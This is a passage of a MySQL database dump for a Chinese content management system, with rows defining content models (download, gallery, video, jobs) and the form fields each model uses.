INSERT INTO `jc_model` (`model_id`,`model_name`,`model_path`,`tpl_channel_prefix`,`tpl_content_prefix`,`title_img_width`,`title_img_height`,`content_img_width`,`content_img_height`,`priority`,`has_content`,`is_disabled`,`is_def`,`is_global`,`site_id`) VALUES (4,'下载','4','download','download',139,139,310,310,4,1,0,0,1,NULL);
INSERT INTO `jc_model` (`model_id`,`model_name`,`model_path`,`tpl_channel_prefix`,`tpl_content_prefix`,`title_img_width`,`title_img_height`,`content_img_width`,`content_img_height`,`priority`,`has_content`,`is_disabled`,`is_def`,`is_global`,`site_id`) VALUES (5,'图库','5','pic','pic',139,139,310,310,5,1,0,0,1,NULL);
INSERT INTO `jc_model` (`model_id`,`model_name`,`model_path`,`tpl_channel_prefix`,`tpl_content_prefix`,`title_img_width`,`title_img_height`,`content_img_width`,`content_img_height`,`priority`,`has_content`,`is_disabled`,`is_def`,`is_global`,`site_id`) VALUES (6,'视频','6','video','video',139,139,310,310,10,1,0,0,1,NULL);
INSERT INTO `jc_model` (`model_id`,`model_name`,`model_path`,`tpl_channel_prefix`,`tpl_content_prefix`,`title_img_width`,`title_img_height`,`content_img_width`,`content_img_height`,`priority`,`has_content`,`is_disabled`,`is_def`,`is_global`,`site_id`) VALUES (8,'招聘','job','job','job',139,139,310,310,10,1,0,0,1,NULL);

#
# Source for table jc_model_item
#

CREATE TABLE `jc_model_item` (
  `modelitem_id` int(11) NOT NULL AUTO_INCREMENT,
  `model_id` int(11) NOT NULL,
  `field` varchar(50) NOT NULL COMMENT '字段',
  `item_label` varchar(100) NOT NULL COMMENT '名称',
  `priority` int(11) NOT NULL DEFAULT '70' COMMENT '排列顺序',
  `def_value` varchar(255) DEFAULT NULL COMMENT '默认值',
  `opt_value` varchar(255) DEFAULT NULL COMMENT '可选项',
  `text_size` varchar(20) DEFAULT NULL COMMENT '长度',
  `area_rows` varchar(3) DEFAULT NULL COMMENT '文本行数',
  `area_cols` varchar(3) DEFAULT NULL COMMENT '文本列数',
  `help` varchar(255) DEFAULT NULL COMMENT '帮助信息',
  `help_position` varchar(1) DEFAULT NULL COMMENT '帮助位置',
  `data_type` int(11) NOT NULL DEFAULT '1' COMMENT '数据类型',
  `is_single` tinyint(1) NOT NULL DEFAULT '1' COMMENT '是否独占一行',
  `is_channel` tinyint(1) NOT NULL DEFAULT '1' COMMENT '是否栏目模型项',
  `is_custom` tinyint(1) NOT NULL DEFAULT '1' COMMENT '是否自定义',
  `is_display` tinyint(1) NOT NULL DEFAULT '1' COMMENT '是否显示',
  `is_required` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否必填项',
  `image_width` int(11) DEFAULT NULL COMMENT '图片宽度',
  `image_height` int(11) DEFAULT NULL COMMENT '图片宽度',
  PRIMARY KEY (`modelitem_id`),
  KEY `fk_jc_item_model` (`model_id`)
) ENGINE=InnoDB AUTO_INCREMENT=459 DEFAULT CHARSET=utf8 COMMENT='CMS模型项表';

#
# Dumping data for table jc_model_item
#

INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (1,1,'name','栏目名称',8,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,0,1,0,1,1,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (2,1,'path','访问路径',8,NULL,NULL,NULL,NULL,NULL,NULL,NULL,2,0,1,0,1,1,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (3,1,'title','meta标题',8,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,0,1,0,1,1,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (4,1,'keywords','meta关键字',8,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,0,1,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (5,1,'description','meta描述',8,NULL,NULL,NULL,NULL,NULL,NULL,NULL,4,1,1,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (6,1,'tplChannel','栏目模板',8,NULL,NULL,NULL,NULL,NULL,NULL,NULL,6,0,1,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (7,1,'tplContent','选择模型模板',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,6,1,1,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (8,1,'channelStatic','栏目静态化',11,NULL,NULL,NULL,NULL,NULL,NULL,NULL,4,1,1,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (9,1,'contentStatic','内容静态化',11,NULL,NULL,NULL,NULL,NULL,NULL,NULL,4,1,1,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (10,1,'priority','排列顺序',11,NULL,NULL,NULL,NULL,NULL,NULL,NULL,2,0,1,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (11,1,'display','显示',11,NULL,NULL,NULL,NULL,NULL,NULL,NULL,8,0,1,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (12,1,'docImg','文档图片',11,NULL,NULL,NULL,NULL,NULL,NULL,NULL,8,1,1,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (14,1,'afterCheck','审核后',12,NULL,NULL,NULL,NULL,NULL,NULL,NULL,6,0,1,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (15,1,'commentControl','评论',11,NULL,NULL,NULL,NULL,NULL,NULL,NULL,8,0,1,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (16,1,'allowUpdown','顶踩',11,NULL,NULL,NULL,NULL,NULL,NULL,NULL,8,0,1,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (17,1,'viewGroupIds','浏览权限',11,NULL,NULL,NULL,NULL,NULL,NULL,NULL,7,0,1,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (18,1,'contriGroupIds','投稿权限',11,NULL,NULL,NULL,NULL,NULL,NULL,NULL,7,0,1,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (20,1,'link','外部链接',11,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,1,1,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (21,1,'titleImg','标题图',11,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,1,1,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (23,1,'title','标题',9,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,1,0,0,1,1,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (24,1,'shortTitle','简短标题',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,0,0,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (25,1,'titleColor','标题颜色',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,6,0,0,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (26,1,'tagStr','Tag标签',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,1,0,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (27,1,'description','摘要',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,4,1,0,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (28,1,'author','作者',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,0,0,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (29,1,'origin','来源',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,0,0,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (30,1,'viewGroupIds','浏览权限',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,7,1,0,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (31,1,'topLevel','固顶级别',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,6,0,0,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (32,1,'releaseDate','发布时间',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,5,0,0,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (33,1,'typeId','内容类型',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,6,0,0,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (34,1,'tplContent','指定模板',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,6,0,0,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (35,1,'typeImg','类型图',11,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,1,0,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (36,1,'titleImg','标题图',11,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,1,0,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (37,1,'contentImg','内容图',11,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,1,0,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (38,1,'attachments','附件',11,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,1,0,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (39,1,'media','多媒体',11,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,1,0,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (40,1,'txt','内容',11,NULL,NULL,NULL,NULL,NULL,NULL,NULL,4,1,0,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (42,2,'name','栏目名称',8,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,0,1,0,1,1,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (43,2,'path','访问路径',8,NULL,NULL,NULL,NULL,NULL,NULL,NULL,2,0,1,0,1,1,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (44,2,'title','meta标题',8,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,0,1,0,1,1,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (45,2,'keywords','meta关键字',8,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,0,1,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (46,2,'description','meta描述',8,NULL,NULL,NULL,NULL,NULL,NULL,NULL,4,1,1,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (47,2,'tplChannel','栏目模板',8,NULL,NULL,NULL,NULL,NULL,NULL,NULL,6,0,1,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (48,2,'priority','排列顺序',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,2,0,1,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (49,2,'display','显示',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,8,0,1,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (51,2,'link','外部链接',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,1,1,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (52,2,'contentImg','内容图',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,1,1,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (53,2,'txt','内容',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,4,1,1,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (93,4,'name','栏目名称',8,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,0,1,0,1,1,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (94,4,'path','访问路径',8,NULL,NULL,NULL,NULL,NULL,NULL,NULL,2,0,1,0,1,1,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (95,4,'title','meta标题',8,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,0,1,0,1,1,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (96,4,'keywords','meta关键字',8,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,0,1,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (97,4,'description','meta描述',8,NULL,NULL,NULL,NULL,NULL,NULL,NULL,4,1,1,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (98,4,'tplChannel','栏目模板',8,NULL,NULL,NULL,NULL,NULL,NULL,NULL,6,0,1,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (99,4,'tplContent','选择模型模板',9,NULL,NULL,NULL,NULL,NULL,NULL,NULL,6,1,1,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (100,4,'priority','排列顺序',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,2,0,1,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (101,4,'display','显示',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,8,0,1,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (102,4,'docImg','文档图片',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,8,1,1,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (103,4,'commentControl','评论',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,8,0,1,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (104,4,'allowUpdown','顶踩',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,8,0,1,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (105,4,'viewGroupIds','浏览权限',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,7,1,1,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (107,4,'channelId','栏目',1,NULL,NULL,NULL,NULL,NULL,NULL,NULL,6,1,0,0,1,1,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (108,4,'title','软件名称',2,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,1,0,0,1,1,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (109,4,'shortTitle','软件简称',3,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,0,0,0,1,0,NULL,NULL);
